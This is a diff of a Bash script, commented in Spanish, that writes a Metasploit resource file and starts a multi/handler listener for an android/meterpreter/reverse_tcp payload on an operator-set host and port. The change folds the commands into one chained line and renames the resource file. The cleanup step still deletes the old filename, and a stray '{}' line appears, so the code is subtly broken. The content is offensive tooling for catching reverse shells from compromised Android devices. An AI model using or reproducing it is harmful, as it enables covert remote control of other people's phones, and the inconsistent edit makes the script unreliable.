@@ -65,12 +65,7 @@ echo "Payload generado: $nombre"
 echo "Iniciando msfconsole..."
 sleep 1
 # Ejecutar metasploit en modo batch
-echo "use exploit/multi/handler" > msfcomandos.rc
-echo "set PAYLOAD android/meterpreter/reverse_tcp" >> msfcomandos.rc
-echo "set LHOST $IP" >> msfcomandos.rc
-echo "set LPORT $PUERTO" >> msfcomandos.rc
-echo "exploit -j" >> msfcomandos.rc
-msfconsole -r msfcomandos.rc
+echo "use exploit/multi/handler" > msfcommands.rc && echo "set PAYLOAD android/meterpreter/reverse_tcp" >> msfcommands.rc && echo "set LHOST $IP" >> msfcommands.rc && echo "set LPORT $PUERTO" >> msfcommands.rc && echo "exploit -j" >> msfcommands.rc && msfconsole -r msfcommands.rc
 {}
 # Limpiar el archivo de comandos despues de su uso
 rm msfcomandos.rc
